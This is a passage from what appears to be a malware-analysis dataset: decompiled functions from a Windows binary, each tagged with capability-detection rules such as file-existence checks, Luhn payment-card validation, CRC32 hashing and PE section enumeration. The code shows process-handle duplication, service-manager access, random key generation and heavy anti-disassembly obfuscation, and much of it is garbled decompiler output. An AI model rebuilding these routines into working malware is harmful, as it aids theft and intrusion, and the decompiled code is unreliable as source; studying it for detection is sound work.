uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x41130c;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &uStack300;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = uVar3 & 3;\n    bVar10 = uVar3 == 0;\n    for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    if ((bVar10) || (!bVar10)) {\n        (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(*0x10 + -300, 0, 0xd8);\n    }\n    else {\n        (**0x6a)(0x47);\n        *(extraout_ECX + -1) = *(extraout_ECX + -1) + extraout_DL;\n    }\n    iVar2 = param_2;\n    if ((param_2 == -1) && (iVar2 = fcn.004044a0(param_1),  iVar2 == -1)) {\n        return 0;\n    }\n    func_0xe095ac42();\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, extraout_DX, extraout_CL);\n    if (param_2 == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1235
    },
    "00403230": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004032d2) overlaps instruction at (ram,0x004032d1)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00403230(void)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint32_t *puVar5;\n    char *unaff_EBX;\n    int32_t unaff_EDI;\n    uint *puVar6;\n    bool bVar7;\n    char cVar8;\n    char cVar9;\n    unkbyte10 extraout_ST0;\n    unkbyte10 extraout_ST0_00;\n    unkbyte10 Var10;\n    ulong uVar11;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    uVar11 = fcn.004044e0();\n    piVar4 = uVar11 >> 0x20;\n    pcVar1 = uVar11;\n    cVar9 = '\\0';\n    cVar8 = pcVar1 < 0;\n    bVar7 = pcVar1 == NULL;\n    if (bVar7) {\n        return false;\n    }\n    if ((bVar7) || (!bVar7)) {\n        uVar11 = func_0x00405100();\n        piVar4 = uVar11 >> 0x20;\n        pcVar2 = uVar11;\n        Var10 = extraout_ST0_00;\n    }\n    else {\n        *(unaff_EDI + -0x18) = *(unaff_EDI + -0x18) - &stack0xffffff78;\n        cVar9 = SCARRY1(*unaff_EBX, unaff_EBX);\n        *unaff_EBX = *unaff_EBX + unaff_EBX;\n        cVar8 = *unaff_EBX < '\\0';\n        pcVar2 = unaff_EBX;\n        unaff_EBX = pcVar1;\n        Var10 = extraout_ST0;\n    }\n    if ((cVar9 == cVar8) && (cVar9 != cVar8)) {\n        *(pcVar2 + -0x7ce92414) = Var10;\n        *piVar4 = *piVar4 + 0x3868df84;\n    }\n    else {\n        unaff_EBX = 0x411338;\n    }\n    iVar3 = fcn.00403e80(unaff_EBX);\n    if (iVar3 != -1) {\n        return false;\n    }\n    fcn.00402670();\n    *0x423780 = 1;\n    uVar11 = fcn.004015e0();\n    puVar5 = uVar11 >> 0x20;\n    bVar7 = (POPCOUNT(uVar11 & 0xff) & 1U) == 0;\n    if (uVar11 != 0) {\n        return false;\n    }\n    if ((bVar7) || (!bVar7)) {\n        puVar5 = puVar5 & 0xffffff00;\n    }\n    *puVar5 = *puVar5 ^ 0xffffffd2;\n    var_80h._0_1_ = SUB41(puVar5, 0);\n    puVar6 = &var_1fh;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    puVar6 = &var_80h + 1;\n    var_60h._0_1_ = var_80h;\n    var_20h = var_80h;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    puVar6 = &var_60h + 1;\n    var_40h._0_1_ = var_80h;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    puVar6 = &var_40h + 1;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    iVar3 = fcn.00402da0(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar3 != 0) {\n        iVar3 = fcn.00402f10(&var_20h);\n        bVar7 = iVar3 == 0;\n        if (bVar7) {\n            return false;\n        }\n        if ((!bVar7) && (bVar7)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        iVar3 = fcn.00401620(&var_80h, &var_60h, &var_20h, &var_40h);\n        return iVar3 != 0;\n    }\n    return false;\n}\n",
        "token_count": 1275
    },
    "00403e80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403e80(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar2 = (**0x4237a4)();\n    if (iVar2 == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar4 = &var_12ch;\n    var_8h = iVar2;\n    for (iVar3 = 0x49; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    iVar3 = (**0x4237a8)();\n    pcVar1 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        if (iVar3 == 0) {\ncode_r0x00403f3f:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            return var_4h;\n        }\n        iVar3 = (*pcVar1)(&var_10ch, arg_8h);\n        if (iVar3 == 0) {\n            var_4h = var_128h;\n            iVar2 = var_8h;\n            goto code_r0x00403f3f;\n        }\n        iVar3 = (**0x4237ac)(iVar2, &var_130h);\n    } while( true );\n}\n",
        "token_count": 394
    },
    "00404310": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040435a) overlaps instruction at (ram,0x00404359)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __cdecl fcn.00404310(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint unaff_EBX;\n    uint *puVar5;\n    uint *puVar6;\n    ushort in_SS;\n    bool in_CF;\n    bool in_PF;\n    \n    if ((!in_PF) && (in_PF)) {\n        segment(in_SS, *0x10 + -0xc);\n        puVar6 = &stack0xfffffff4 & 0xffff0000 | *0x10 - 8;\n        if (in_CF) {\n            pcVar1 = swi(1);\n            uVar3 = (*pcVar1)();\n            return uVar3;\n        }\n        if (in_PF) {\n            *puVar6 = 0;\n            puVar6[-1] = arg_8h;\n            pcVar1 = _sym.imp.MSVCRT.dll__access;\n            puVar5 = puVar6 + -2;\n            puVar6[-2] = 0x4042de;\n            iVar2 = (*pcVar1)();\n            if (iVar2 == -1) {\n                return 1;\n            }\n            *(puVar5 + 4) = unaff_EBX;\n            return 0;\n        }\n    }\n    uVar3 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar4 = fcn.00401000(uVar3, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar3);\n    return uVar4;\n}\n",
        "token_count": 405
    },
    "00404900": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040497f) overlaps instruction at (ram,0x0040497b)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.00404900(uint *param_1)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint uVar7;\n    uint8_t extraout_CH;\n    uint *puVar8;\n    uchar *puVar9;\n    uint32_t unaff_EDI;\n    bool bVar10;\n    ulong uVar11;\n    uint uStackY24;\n    uint uStackY20;\n    \n    uStackY20 = 0x404931;\n    iVar4 = fcn.00403e80(0x411340);\n    if (iVar4 == -1) {\n        return 0;\n    }\n    if ((iVar4 != -1) || (iVar4 == -1)) {\n        uStackY20 = 0;\n    }\n    uVar2 = *(unaff_EDI + 0xe58be73);\n    uStackY24 = 0x40;\n    uVar11 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    puVar5 = uVar11;\n    bVar10 = puVar5 == NULL;\n    if (bVar10) {\n        return 0;\n    }\n    if ((bVar10) || (puVar6 = puVar5,  !bVar10)) {\n        puVar6 = param_1;\n    }\n    *(unaff_EDI ^ uVar2) = *puVar5;\n    puVar1 = (uVar11 >> 0x20) + 2;\n    *puVar1 = *puVar1 | extraout_CH;\n    puVar6[-1] = 0;\n    puVar6[-2] = 0;\n    puVar6[-3] = 0;\n    puVar6[-4] = puVar5 + 1;\n    puVar6[-5] = &stack0xffffffe8;\n    pcVar3 = _sym.imp.KERNEL32.dll_GetCurrentProcess;\n    puVar8 = puVar6 + -6;\n    puVar6[-6] = 0x404992;\n    uVar7 = (*pcVar3)();\n    *(puVar8 + -4) = uVar7;\n    pcVar3 = _sym.imp.KERNEL32.dll_DuplicateHandle;\n    puVar9 = puVar8 + -8;\n    *(puVar8 + -8) = 0x404999;\n    uVar11 = (*pcVar3)();\n    if (uVar11 == 0) {\n        return 0;\n    }\n    *(puVar9 + -4) = uVar11 >> 0x20;\n    *(puVar9 + -6) = 0xdf72;\n    *(puVar9 + -4) = puVar5 + 1;\n    pcVar3 = _sym.imp.KERNEL32.dll_CloseHandle;\n    *(puVar9 + -8) = 0x4049b7;\n    (*pcVar3)();\n    return 1;\n}\n",
        "token_count": 704
    },
    "004049c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404a36) overlaps instruction at (ram,0x00404a35)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.004049c0(void)\n\n{\n    uchar *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint in_EAX;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t extraout_ECX;\n    uint8_t *unaff_EBX;\n    uchar *puVar7;\n    uchar *puVar8;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint8_t in_AF;\n    bool bVar9;\n    char cVar10;\n    char cVar11;\n    float10 extraout_ST0;\n    float10 extraout_ST0_00;\n    float10 fVar12;\n    ulong uVar13;\n    \n    cVar11 = '\\0';\n    cVar10 = '\\0';\n    bVar9 = ((unaff_EBX & 0xff00 | unaff_EBX | in_EAX >> 8) & 0x94f) == 0;\n    uVar13 = fcn.00404560();\n    *0x42377c = uVar13;\n    if ((bVar9 || cVar11 != cVar10) || (!bVar9 && cVar11 == cVar10)) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n        bVar9 = -1 < iVar5 + 1;\n        if (iVar5 == -1) {\n            return 0;\n        }\n        if ((bVar9) && (!bVar9)) {\n            *unaff_EBX = *unaff_EBX & 0xc3;\n        }\n        iVar6 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n        if (iVar6 != 0) {\n            fVar12 = extraout_ST0;\n            if (*0x42377c != 0) {\n                iVar6 = fcn.00404900(iVar5);\n                *0x42377c = iVar6 == 0;\n                fVar12 = extraout_ST0_00;\n            }\n            if ((-1 < *0x42377c) && (-1 >= *0x42377c)) {\n                *(unaff_EDI + 7) = fVar12;\n                iVar5 = iVar5 + 5;\n            }\n            fcn.00401dc0(0, iVar5);\n            if (*0x42377c == 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar5);\n            }\n            return 1;\n        }\n        return 0;\n    }\n    in_AF = 9 < (uVar13 & 0xf) | in_AF;\n    uVar4 = *0x42377c & 0xffff0000 | CONCAT11((uVar13 >> 8) + in_AF, uVar13 + in_AF * '\\x06') & 0xff0f;\n    if (extraout_ECX != 0) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *unaff_EDI = *unaff_ESI;\n    puVar1 = (uVar13 >> 0x20) + 2;\n    *puVar1 = *puVar1;\n    *(uVar4 - 4) = 0;\n    *(uVar4 - 8) = 0;\n    *(uVar4 - 0xc) = 0;\n    *(uVar4 - 0x10) = unaff_ESI + 1;\n    *(uVar4 - 0x14) = &stack0xffffffec;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetCurrentProcess;\n    puVar7 = uVar4 - 0x18;\n    *(uVar4 - 0x18) = 0x404992;\n    uVar3 = (*pcVar2)();\n    *(puVar7 + -4) = uVar3;\n    pcVar2 = _sym.imp.KERNEL32.dll_DuplicateHandle;\n    puVar8 = puVar7 + -8;\n    *(puVar7 + -8) = 0x404999;\n    uVar13 = (*pcVar2)();\n    if (uVar13 != 0) {\n        *(puVar8 + -4) = uVar13 >> 0x20;\n        *(puVar8 + -6) = CONCAT11(0xdf, unaff_EBX);\n        *(puVar8 + -4) = unaff_ESI + 1;\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        *(puVar8 + -8) = 0x4049b7;\n        (*pcVar2)();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1085
    },
    "00401920": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401920(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uchar uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *unaff_ESI;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    bool bVar9;\n    unkbyte6 Var10;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    puVar7 = &stack0xfffffffc;\n    bVar9 = (POPCOUNT(&var_24h & 0xff) & 1U) != 0;\n    if ((bVar9) && (!bVar9)) {\n        puVar8 = &stack0xffffffc8;\n        cVar1 = '\\x1e';\n        do {\n            puVar7 = puVar7 + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *puVar7;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar4 = in(0x78);\n        return uVar4;\n    }\n    Var10 = fcn.00402ca0(arg_18h, arg_1ch, 0x411318, 7);\n    pcVar2 = _sym.imp.MSVCRT.dll_rand;\n    var_4h = Var10;\n    bVar9 = var_4h == NULL;\n    if (bVar9) {\n        return 0;\n    }\n    if ((!bVar9) && (bVar9)) {\n        out(*unaff_ESI, Var10 >> 0x20);\n    }\n    var_24h = 0;\n    puVar7 = &var_23h;\n    for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uVar6 = 0;\n    do {\n        uVar3 = (*pcVar2)();\n        (&var_24h)[uVar6] = uVar3;\n        uVar6 = uVar6 + 1;\n    } while (uVar6 < 0x20);\n    puVar7 = &var_24h;\n    puVar8 = var_4h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    fcn.00404040(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n    fcn.00401f20(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 726
    },
    "00401a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00401a70(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00403f50;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x4112d0;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 220
    },
    "00401fb0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004024d4) overlaps instruction at (ram,0x004024d2)\n// \n// WARNING: Removing unreachable block (ram,0x00402192)\n\nuint __cdecl fcn.00401fb0(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    char *pcVar1;\n    uint *puVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    unkbyte6 Var5;\n    uint8_t uVar6;\n    uint8_t extraout_AH;\n    int32_t iVar7;\n    uint uVar8;\n    uint32_t *puVar9;\n    ushort extraout_CX;\n    ushort extraout_CX_00;\n    ushort uVar10;\n    uint16_t uVar11;\n    uint16_t uVar12;\n    char extraout_CH;\n    char extraout_CH_00;\n    uchar *extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint8_t uVar13;\n    int32_t extraout_ECX_01;\n    ushort extraout_DX;\n    uint16_t extraout_DX_00;\n    int32_t extraout_EDX;\n    uint32_t unaff_EBX;\n    uchar *unaff_EDI;\n    uint *arg_ch;\n    ushort in_SS;\n    bool bVar14;\n    uchar uVar15;\n    uchar uVar16;\n    char cVar17;\n    uchar uVar18;\n    bool bVar19;\n    char cVar20;\n    bool bVar21;\n    unkbyte3 Var22;\n    unkbyte3 Var23;\n    uchar uVar24;\n    uchar uVar25;\n    ushort uVar26;\n    uchar uVar27;\n    uchar uVar28;\n    ushort uVar29;\n    uchar uVar30;\n    ushort uVar31;\n    ushort uVar32;\n    uint8_t uVar33;\n    uchar uVar34;\n    uchar uVar35;\n    \n    iVar7 = (*_sym.imp.MSVCRT.dll_fopen)();\n    if (iVar7 == 0) {\n        return 0;\n    }\n    bVar14 = false;\n    bVar19 = false;\n    bVar21 = false;\n    uVar18 = 1;\n    uVar24 = 0;\n    uVar26 = ptr >> 0x10;\n    (*_sym.imp.MSVCRT.dll_fwrite)();\n    if ((bVar19) || (!bVar19)) {\n        (*_sym.imp.MSVCRT.dll_fflush)();\n        (*_sym.imp.MSVCRT.dll_fclose)();\n        return 1;\n    }\n    puVar2 = unaff_EDI + 1;\n    uVar25 = in(extraout_DX);\n    *unaff_EDI = uVar25;\n    if (bVar14 || bVar21) {\n        pcVar1 = (unaff_EBX & 0xffff0000 | CONCAT11(*extraout_ECX, 0xbc)) + 0x226014c4;\n        *pcVar1 = *pcVar1 + 'W';\n        return 0xf015ff57;\n    }\n    fcn.00401d20(0x411754, 0x12, 0x4112f4, 0x12);\n    fcn.00401d20(0x411754, 0x12, 0x411308, 4);\n    iVar7 = (CONCAT13(uVar24, CONCAT12(uVar18, uVar26)) >> 8 & 0xffff00) << 8;\n    fcn.00401d20(0x411754, 0x12, 0x41130c, 0xc);\n    fcn.00401d20(0x411754, 0x12, 0x411318, 7);\n    cVar20 = '\\0';\n    cVar17 = '\\0';\n    uVar4 = CONCAT12(iVar7 >> 0x10, uVar26);\n    uVar8 = fcn.00401d20(0x411754, 0x12, 0x411320, 0xb);\n    arg_ch = puVar2;\n    if ((cVar20 == cVar17) && (cVar20 != cVar17)) {\n        out(0xc4, uVar8);\n        arg_ch = unaff_EDI + 5;\n        *puVar2 = uVar8;\n    }\n    uVar28 = 0xc;\n    uVar30 = 0;\n    uVar32 = 0;\n    uVar25 = 0x2c;\n    uVar27 = 0x13;\n    uVar31 = 0x41;\n    uVar18 = 0x12;\n    uVar24 = 0;\n    uVar29 = 0;\n    do {\n        fcn.00401d20(0x411754, CONCAT22(uVar29, CONCAT11(uVar24, uVar18)), CONCAT22(uVar31, CONCAT11(uVar27, uVar25)), \n                     CONCAT22(uVar32, CONCAT11(uVar30, uVar28)));\n        fcn.00401d20(0x411754, 0x12, 0x411338, 8);\n        fcn.00401d20(0x411754, 0x12, 0x411340, 0xd);\n        uVar15 = 0;\n        bVar21 = false;\n        uVar16 = (POPCOUNT((extraout_AH ^ 0x68) & 0x30) & 1U) == 0;\n        uVar6 = 0x18;\n        uVar13 = 0;\n        uVar34 = 0;\n        uVar35 = 0;\n        fcn.00401d20(0x411754, 0x12, 0x411350, 0x18);\n        if ((!bVar21) && (bVar21)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar28 = 0x25;\n        uVar30 = 0;\n        uVar32 = 0;\n        uVar25 = 0x68;\n        uVar27 = 0x13;\n        uVar31 = 0x41;\n        uVar18 = 0x12;\n        uVar24 = 0;\n        uVar29 = 0;\n        fcn.00401d20(0x411754, 0x12, 0x411368, 0x25);\n        uVar33 = uVar4 >> 8;\n        if ((uVar16) || (!uVar16)) break;\n        segment(in_SS, *0x10 + -0x46);\n        uVar10 = extraout_CX;\n        if (uVar15) goto code_r0x00402289;\n    } while (uVar16);\n    fcn.00401d20(0x411754, 0x12, 0x411390, 10);\n    uVar34 = uVar4 >> 0x10;\n    uVar10 = extraout_CX_00;\n    uVar6 = uVar26;\n    uVar13 = uVar33;\n    uVar35 = iVar7 >> 0x18;\ncode_r0x00402289:\n    cVar20 = '\\0';\n    uVar11 = CONCAT11(uVar10 >> 8 & uVar33, uVar10 | uVar26) & arg_ch;\n    cVar17 = uVar11 < 0;\n    bVar21 = uVar11 == 0;\n    uVar11 = CONCAT11(uVar13, uVar6);\n    uVar18 = 0xa6;\n    uVar24 = 0x22;\n    uVar26 = 0x40;\n    fcn.00401d20(0x411754, 0x12, 0x41139c, 0xc);\n    if ((bVar21 || cVar20 != cVar17) || (!bVar21 && cVar20 == cVar17)) {\n        uVar18 = 0xd;\n        uVar24 = 0;\n        uVar26 = 0;\n    }\n    fcn.00401d20(0x411754, 0x12, 0x4113a8, CONCAT22(uVar26, CONCAT11(uVar24, uVar18)));\n    fcn.00401d20(0x411754, 0x12, 0x4113b8, 6);\n    fcn.00401d20(0x411754, 0x12, 0x4113c0, 5);\n    fcn.00401d20(0x411754, 0x12, 0x4113c8, 0xd);\n    fcn.00401d20(0x411754, 0x12, 0x4113d8, 0x19);\n    puVar3 = CONCAT13(uVar35, CONCAT12(uVar34, uVar11)) & 0xffff0000 | uVar11;\n    fcn.00401d20(0x411754, 0x12, 0x4113f4, 0xf);\n    iVar7 = fcn.00401d20(0x411754, 0x12, 0x411404, 0xe);\n    iVar7 = extraout_ECX_00 - iVar7;\n    while( true ) {\n        uVar12 = iVar7 & 0xff00 | iVar7 ^ iVar7 >> 8 | 0x3d00 | uVar11;\n        uVar6 = uVar12;\n        uVar13 = uVar12 >> 8;\n        bVar21 = uVar13 < uVar6;\n        uVar18 = uVar13 - uVar6 < '\\0';\n        puVar9 = fcn.00401d20(0x411754, 0x12, 0x411414, 0xb);\n        if ((bVar21) || (!bVar21)) break;\n        iVar7 = extraout_ECX_01;\n        if (&stack0xffffffca < *puVar9 || puVar9 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    uVar28 = 0x20;\n    uVar30 = 0x14;\n    uVar31 = 0x41;\n    uVar27 = 0;\n    uVar29 = 0;\n    uVar24 = 0x25;\n    uVar25 = 0x24;\n    uVar26 = 0x40;\n    fcn.00401d20(0x411754, 0x12, 0x411420, 0xb);\n    if ((uVar18) || (!uVar18)) {\n        uVar24 = 0xb;\n        uVar25 = 0;\n        uVar26 = 0;\n    }\n    *puVar3 = *puVar3 & 0xc3;\n    uVar6 = fcn.00401d20(0x411754, 0x12, 0x41142c, CONCAT22(uVar26, CONCAT11(uVar25, uVar24)));\n    bVar21 = (POPCOUNT(uVar6 ^ 0xca) & 1U) == 0;\n    uVar18 = 0x54;\n    iVar7 = fcn.00401d20(0x411754, 0x12, 0x411438, 10);\n    Var5 = *0x6a17b43a;\n    if (!bVar21) {\n        uVar24 = SUB41(arg_ch, 0);\n        uVar25 = arg_ch >> 8;\n        uVar26 = arg_ch >> 0x10;\n        if (bVar21) goto code_r0x0040247e;\n    }\n    uVar24 = 0xc;\n    uVar25 = 0;\n    uVar26 = 0;\n    uVar28 = 0x44;\n    uVar30 = 0x14;\n    uVar31 = 0x41;\n    uVar27 = 0;\n    uVar29 = 0;\ncode_r0x0040247e:\n    *(iVar7 + 0x12) = *(iVar7 + 0x12) + extraout_CH;\n    fcn.00401d20(0x411754, CONCAT13(uVar28, CONCAT21(uVar29, uVar27)), CONCAT13(uVar24, CONCAT21(uVar31, uVar30)), \n                 CONCAT13(uVar18, CONCAT21(uVar26, uVar25)));\n    fcn.00401d20(0x411754, 0x12, 0x411450, 0xe);\n    *(extraout_EDX + 0x12) = *(extraout_EDX + 0x12) + extraout_CH_00;\n    fcn.00401d20(0x411754, arg_ch, 0x34a96cf4, Var5);\n    uVar28 = 0x13;\n    uVar29 = 0;\n    uVar30 = 0;\n    uVar25 = 0x74;\n    uVar26 = 0x4114;\n    uVar27 = 0;\n    uVar24 = 0;\n    Var22 = 0x411754;\n    Var23 = 0x12;\n    uVar18 = 0;\n    while( true ) {\n        uVar12 = fcn.00401d20(CONCAT13(uVar18, Var22), CONCAT13(uVar24, Var23), \n                              CONCAT13(uVar27, CONCAT21(uVar26, uVar25)), CONCAT13(uVar30, CONCAT21(uVar29, uVar28)));\n        bVar21 = false;\n        bVar19 = false;\n        bVar14 = (((uVar12 & 0xff | (uVar12 >> 8 & extraout_DX_00 >> 8) << 8) * 2 | extraout_DX_00) ^ 0x6c00) == uVar11;\n        uVar28 = 0x14;\n        uVar29 = 0;\n        uVar30 = 0;\n        uVar25 = 0x88;\n        uVar26 = 0x4114;\n        uVar27 = 0;\n        uVar24 = 0;\n        Var23 = 0x12;\n        uVar18 = 0;\n        Var22 = 0x411754;\n        fcn.00401d20(0x411754, 0x12, 0x411488, 0x14);\n        if ((bVar21 || bVar14) || (!bVar21 && !bVar14)) break;\n        if (!bVar19) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.00401d20(0x411754, 0x12, 0x41149c, 0x33);\n    fcn.00401d20(0x411754, 0x12, 0x4114d0, 10);\n    fcn.00401d20(0x411754, 0x12, 0x4114dc, 4);\n    fcn.00401d20(0x411754, 0x12, 0x4114e0, 5);\n    fcn.00401d20(0x411754, 0x12, 0x4114e8, 6);\n    fcn.00401d20(0x411754, 0x12, 0x41151c, 0x2a);\n    uVar8 = fcn.00401d20(0x411754, 0x12, 0x411548, 0xb);\n    return uVar8;\n}\n",
        "token_count": 3514
    },
    "00403650": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
